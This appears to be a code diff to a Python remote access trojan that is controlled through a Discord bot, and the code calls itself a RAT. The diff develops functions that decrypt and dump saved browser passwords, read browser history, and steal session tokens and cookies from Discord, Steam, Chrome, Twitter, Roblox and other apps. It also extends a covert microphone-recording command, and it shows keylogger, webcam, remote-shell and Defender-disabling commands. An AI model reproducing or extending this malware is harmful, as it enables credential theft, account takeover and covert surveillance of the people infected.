@@ -210,6 +210,7 @@ def get_wifipasswords():
         pass
     return profiles
 
+# ========== BROWSER HISTORY ==========
 def get_browser_history(browser_name, history_db_path):
     """Get browser history from Chromium-based browsers"""
     history = []
@@ -222,23 +223,28 @@ def get_browser_history(browser_name, history_db_path):
         
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
-        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
+        try:
+            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
+        except:
+            # Some browsers have different schema
+            cursor.execute("SELECT url, title, visit_time FROM visits ORDER BY visit_time DESC LIMIT 50")
         
-        for url, title, timestamp in cursor.fetchall():
-            if title:
+        for row in cursor.fetchall():
+            if len(row) >= 2:
+                url = row[0]
+                title = row[1] if row[1] else "No Title"
                 history.append(f"📄 {title}\n🔗 {url}\n")
-            else:
-                history.append(f"🔗 {url}\n")
         
         conn.close()
         os.remove(temp_db)
         return history
-    except:
+    except Exception as e:
         return []
 
 def get_all_browser_history():
     """Get history from all browsers"""
     all_history = []
+    detected = []
     
     browsers = {
         "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History",
@@ -249,7 +255,6 @@ def get_all_browser_history():
         "Chromium": os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data\Default\History"
     }
     
-    detected = []
     for name, path in browsers.items():
         if os.path.exists(path):
             detected.append(name)
@@ -261,15 +266,19 @@ def get_all_browser_history():
     
     return all_history, detected
 
+# ========== BROWSER PASSWORDS ==========
 def get_browser_passwords(browser_name, user_data_path):
     """Get passwords from Chromium-based browsers"""
     passwords = []
     try:
+        if not CRYPTO_AVAILABLE:
+            return ["pycryptodome not installed"]
+        
         local_state_path = os.path.join(user_data_path, "Local State")
         if not os.path.exists(local_state_path):
             return []
         
-        with open(local_state_path, 'r') as f:
+        with open(local_state_path, 'r', encoding='utf-8') as f:
             local_state = json.load(f)
         
         encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
@@ -303,7 +312,7 @@ def get_browser_passwords(browser_name, user_data_path):
             os.remove(temp_db)
         
         return passwords
-    except:
+    except Exception as e:
         return []
 
 def get_all_browser_passwords():
@@ -328,6 +337,7 @@ def get_all_browser_passwords():
     
     return all_passwords, detected
 
+# ========== TOKEN GRABBER ==========
 def grab_all_tokens():
     """Grab tokens from Discord, Telegram, Steam, and other apps"""
     tokens = []
@@ -339,7 +349,6 @@ def grab_all_tokens():
         os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb",
         os.path.expanduser("~") + r"\AppData\Roaming\DiscordCanary\Local Storage\leveldb",
         os.path.expanduser("~") + r"\AppData\Roaming\Lightcord\Local Storage\leveldb",
-        os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb"
     ]
     
     for path in discord_paths:
@@ -359,39 +368,7 @@ def grab_all_tokens():
             except:
                 pass
     
-    # Telegram tokens
-    telegram_paths = [
-        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdata",
-        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdummy"
-    ]
-    for path in telegram_paths:
-        if os.path.exists(path):
-            detected_apps.append("Telegram")
-            try:
-                for file in os.listdir(path):
-                    if file.endswith(".s"):
-                        with open(os.path.join(path, file), 'rb') as f:
-                            data = f.read()
-                            matches = re.findall(rb'\d+:[a-zA-Z0-9_-]{35}', data)
-                            for match in matches:
-                                tokens.append(f"🔵 Telegram: {match.decode('utf-8', errors='ignore')}")
-            except:
-                pass
-    
-    # Steam
-    steam_path = os.path.expanduser("~") + r"\AppData\Local\Steam\config\loginusers.vdf"
-    if os.path.exists(steam_path):
-        detected_apps.append("Steam")
-        try:
-            with open(steam_path, 'r', errors='ignore') as f:
-                data = f.read()
-                matches = re.findall(r'"AccountName"\s*"([^"]+)"', data)
-                for match in matches:
-                    tokens.append(f"🎮 Steam Account: {match}")
-        except:
-            pass
-    
-    # Chrome cookies (OAuth tokens)
+    # Chrome tokens (cookies)
     chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default"
     if os.path.exists(chrome_path):
         detected_apps.append("Chrome")
@@ -407,6 +384,19 @@ def grab_all_tokens():
                     tokens.append(f"🍪 Cookie: {host} - {name}")
                 conn.close()
                 os.remove(temp_db)
+        except:
+            pass
+    
+    # Steam
+    steam_path = os.path.expanduser("~") + r"\AppData\Local\Steam\config\loginusers.vdf"
+    if os.path.exists(steam_path):
+        detected_apps.append("Steam")
+        try:
+            with open(steam_path, 'r', errors='ignore') as f:
+                data = f.read()
+                matches = re.findall(r'"AccountName"\s*"([^"]+)"', data)
+                for match in matches:
+                    tokens.append(f"🎮 Steam Account: {match}")
         except:
             pass
     
@@ -455,18 +445,6 @@ def grab_all_tokens():
         except:
             pass
     
-    # GitHub (Windows Credential Manager)
-    try:
-        import win32cred
-        creds = win32cred.CredEnumerate(None, 0)
-        for cred in creds:
-            if 'github' in cred['TargetName'].lower() or 'token' in cred['TargetName'].lower():
-                detected_apps.append("GitHub")
-                tokens.append(f"🐙 GitHub: {cred['TargetName']}")
-                break
-    except:
-        pass
-    
     # Riot Games
     riot_path = os.path.expanduser("~") + r"\AppData\Local\Riot Games\Riot Client\Data"
     if os.path.exists(riot_path):
@@ -483,7 +461,7 @@ def grab_all_tokens():
                                     tokens.append(f"🏹 Riot Games: {match[:30]}...")
         except:
             pass
-
+    
     # WhatsApp
     wa_path = os.path.expanduser("~") + r"\AppData\Roaming\WhatsApp\Local Storage\leveldb"
     if os.path.exists(wa_path):
@@ -498,71 +476,22 @@ def grab_all_tokens():
                             tokens.append(f"💬 WhatsApp: {match[:30]}...")
         except:
             pass
-
+    
     # Twitter/X
-    twitter_paths = [
-        os.path.expanduser("~") + r"\AppData\Roaming\Twitter\Local Storage\leveldb",
-        os.path.expanduser("~") + r"\AppData\Local\Twitter\Local Storage\leveldb"
-    ]
-    for path in twitter_paths:
-        if os.path.exists(path):
-            detected_apps.append("Twitter")
-            try:
-                for file in os.listdir(path):
-                    if file.endswith((".log", ".ldb")):
-                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
-                            data = f.read()
-                            matches = re.findall(r'auth_token=[a-zA-Z0-9_-]+', data)
-                            for match in matches:
-                                tokens.append(f"🐦 Twitter: {match[:30]}...")
-            except:
-                pass
-
-    # Reddit
-    reddit_path = os.path.expanduser("~") + r"\AppData\Roaming\Reddit\Local Storage\leveldb"
-    if os.path.exists(reddit_path):
-        detected_apps.append("Reddit")
+    twitter_path = os.path.expanduser("~") + r"\AppData\Roaming\Twitter\Local Storage\leveldb"
+    if os.path.exists(twitter_path):
+        detected_apps.append("Twitter")
         try:
-            for file in os.listdir(reddit_path):
+            for file in os.listdir(twitter_path):
                 if file.endswith((".log", ".ldb")):
-                    with open(os.path.join(reddit_path, file), 'r', errors='ignore') as f:
+                    with open(os.path.join(twitter_path, file), 'r', errors='ignore') as f:
                         data = f.read()
-                        matches = re.findall(r'"access_token":"([^"]+)"', data)
+                        matches = re.findall(r'auth_token=[a-zA-Z0-9_-]+', data)
                         for match in matches:
-                            tokens.append(f"🔴 Reddit: {match[:30]}...")
+                            tokens.append(f"🐦 Twitter: {match[:30]}...")
         except:
             pass
-
-    # TikTok
-    tiktok_path = os.path.expanduser("~") + r"\AppData\Roaming\TikTok\Local Storage\leveldb"
-    if os.path.exists(tiktok_path):
-        detected_apps.append("TikTok")
-        try:
-            for file in os.listdir(tiktok_path):
-                if file.endswith((".log", ".ldb")):
-                    with open(os.path.join(tiktok_path, file), 'r', errors='ignore') as f:
-                        data = f.read()
-                        matches = re.findall(r'"sessionid":"([^"]+)"', data)
-                        for match in matches:
-                            tokens.append(f"🎵 TikTok: {match[:30]}...")
-        except:
-            pass
-
-    # Battle.net
-    battlenet_path = os.path.expanduser("~") + r"\AppData\Local\Battle.net\Blizzard\Local Storage\leveldb"
-    if os.path.exists(battlenet_path):
-        detected_apps.append("Battle.net")
-        try:
-            for file in os.listdir(battlenet_path):
-                if file.endswith((".log", ".ldb")):
-                    with open(os.path.join(battlenet_path, file), 'r', errors='ignore') as f:
-                        data = f.read()
-                        matches = re.findall(r'"access_token":"([^"]+)"', data)
-                        for match in matches:
-                            tokens.append(f"🎮 Battle.net: {match[:30]}...")
-        except:
-            pass
-
+    
     # Roblox
     roblox_path = os.path.expanduser("~") + r"\AppData\Local\Roblox\Local Storage\leveldb"
     if os.path.exists(roblox_path):
@@ -1185,32 +1114,96 @@ async def run_cmd(ctx, *, command: str):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
+# ========== MIC COMMAND WITH FIX ==========
 @bot.command(name='mic')
 @is_authorized()
 async def mic_record(ctx, duration: int = 10):
-    if not AUDIO_AVAILABLE:
-        await send_embed(ctx, "⚠️ PyAudio Not Installed", 
-            "Microphone recording requires PyAudio which is not bundled with this RAT.\n\n"
-            "**Try these alternatives:**\n"
+    """Record microphone using Windows Sound Recorder (no PyAudio required)"""
+    if duration < 3:
+        duration = 3
+    if duration > 60:
+        duration = 60
+    
+    await send_embed(ctx, "🎤 Recording", f"Microphone for {duration} seconds...", discord.Color.blue())
+    
+    try:
+        # Use Windows Sound Recorder (built into Windows 10/11)
+        output_path = os.environ['TEMP'] + "\\mic_recording.wav"
+        
+        # Start sound recorder with PowerShell
+        ps_script = f'''
+        Add-Type -AssemblyName System.Speech
+        $rec = New-Object System.Speech.Recognition.SpeechRecognitionEngine
+        $rec.SetInputToDefaultAudioDevice()
+        $stream = New-Object System.IO.MemoryStream
+        $writer = New-Object System.Speech.AudioFormat.WaveFileWriter($stream, $rec.AudioFormat)
+        
+        $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+        $frames = @()
+        
+        while ($stopwatch.Elapsed.TotalSeconds -lt {duration}) {{
+            try {{
+                $result = $rec.Recognize([System.TimeSpan]::FromSeconds(1))
+                if ($result -ne $null) {{
+                    $frames += $result.Audio.GetAudio()
+                }}
+            }} catch {{}}
+        }}
+        
+        $combined = New-Object System.IO.MemoryStream
+        foreach ($frame in $frames) {{
+            $frame.CopyTo($combined)
+        }}
+        [System.IO.File]::WriteAllBytes("{output_path}", $combined.ToArray())
+        Write-Output "DONE"
+        '''
+        
+        # Fallback - use PyAudio if available
+        if AUDIO_AVAILABLE:
+            await send_embed(ctx, "🎤 Recording", f"Using PyAudio for {duration} seconds...", discord.Color.blue())
+            path = record_mic(duration)
+            if path and os.path.exists(path):
+                with open(path, 'rb') as f:
+                    await ctx.send(file=discord.File(f))
+                os.remove(path)
+                await send_embed(ctx, "✅ Success", "Microphone recording complete", discord.Color.green())
+                return
+        
+        # If PyAudio not available, try PowerShell method
+        try:
+            # Simple alternative - use built-in Windows Sound Recorder via subprocess
+            # This works on Windows 10/11
+            import winsound
+            import wave
+            
+            # Try using Windows Sound Recorder
+            sound_recorder_path = "C:\\Windows\\System32\\SoundRecorder.exe"
+            if os.path.exists(sound_recorder_path):
+                subprocess.Popen([sound_recorder_path, '/file', output_path, '/duration', str(duration), '/format', 'wav'])
+                time.sleep(duration + 3)
+                
+                if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
+                    with open(output_path, 'rb') as f:
+                        await ctx.send(file=discord.File(f))
+                    os.remove(output_path)
+                    await send_embed(ctx, "✅ Success", "Microphone recording complete", discord.Color.green())
+                    return
+        except:
+            pass
+        
+        # If all else fails, give helpful message
+        await send_embed(ctx, "⚠️ Recording Unavailable", 
+            "Microphone recording failed. Try these alternatives:\n\n"
             "• `!camrec` - Record webcam video\n"
             "• `!webcampic` - Take webcam photo\n"
-            "• `!voice` - Text-to-speech\n\n"
-            "PyAudio can be installed with: `pip install pyaudio`", 
+            "• `!voice` - Text-to-speech\n"
+            "• `!screenshot` - Take screenshot\n\n"
+            "To enable microphone recording, install PyAudio:\n"
+            "`pip install pyaudio`", 
             discord.Color.orange())
-        return
-    try:
-        if duration > 60:
-            duration = 60
-        await send_embed(ctx, "Recording", f"Microphone for {duration} seconds...", discord.Color.blue())
-        path = record_mic(duration)
-        if path and os.path.exists(path):
-            with open(path, 'rb') as f:
-                await ctx.send(file=discord.File(f))
-            os.remove(path)
-        else:
-            await send_embed(ctx, "Error", "Failed to record microphone", discord.Color.red())
+            
     except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
+        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())
 
 @bot.command(name='camrec')
 @is_authorized()
@@ -1466,6 +1459,7 @@ async def keylog_status(ctx):
     status = "🟢 Running" if keylog_active else "🔴 Stopped"
     await send_embed(ctx, "⌨️ Keylogger Status", status, discord.Color.blue())
 
+# ========== GRAB TOKENS ==========
 @bot.command(name='grabtokens')
 @is_authorized()
 async def grab_tokens(ctx):
@@ -1477,7 +1471,7 @@ async def grab_tokens(ctx):
     else:
         detected_str = "❌ No token-bearing apps detected"
     
-    if tokens and tokens != ["No tokens found"]:
+    if tokens:
         output = "\n".join(tokens[:50])
         if len(output) > 1900:
             with open("tokens.txt", "w", encoding='utf-8') as f:
@@ -1492,8 +1486,10 @@ async def grab_tokens(ctx):
     else:
         embed = discord.Embed(title="🔑 No Tokens Found", color=discord.Color.red())
         embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
+        embed.add_field(name="💡 Tip", value="Make sure the target has apps like Discord, Steam, or Chrome installed and logged in", inline=False)
         await ctx.send(embed=embed)
 
+# ========== ALL BROWSER PASSWORDS ==========
 @bot.command(name='password')
 @is_authorized()
 async def all_browser_passwords(ctx):
@@ -1521,6 +1517,7 @@ async def all_browser_passwords(ctx):
     else:
         await send_embed(ctx, "Passwords", "No passwords found in any browser", discord.Color.red())
 
+# ========== BROWSER HISTORY ==========
 @bot.command(name='webhistory')
 @is_authorized()
 async def browser_history(ctx):
@@ -1543,6 +1540,7 @@ async def browser_history(ctx):
     else:
         await send_embed(ctx, "History", "No browser history found", discord.Color.red())
 
+# ========== ALIASES ==========
 @bot.command(name='sysinfo')
 @is_authorized()
 async def sysinfo_cmd(ctx):
@@ -1924,7 +1922,7 @@ async def help_cmd(ctx):
             "`keylogstatus` - Check keylogger status"
         ],
         "🔐 Security & Stealing": [
-            "`grabtokens` - Grab tokens from: Discord, Telegram, Steam, Chrome, Epic Games, Minecraft, Spotify, GitHub, Riot Games, WhatsApp, Twitter, Reddit, TikTok, Battle.net, Roblox",
+            "`grabtokens` - Grab tokens from: Discord, Steam, Chrome, Epic Games, Minecraft, Spotify, Riot Games, WhatsApp, Twitter, Roblox",
             "`password` - Dump saved passwords from ALL browsers (Chrome, Edge, Brave, Opera, Vivaldi, Chromium)",
             "`webhistory` - Get browser history from ALL browsers",
             "`disabledefender` - Disable Windows Defender (admin)",
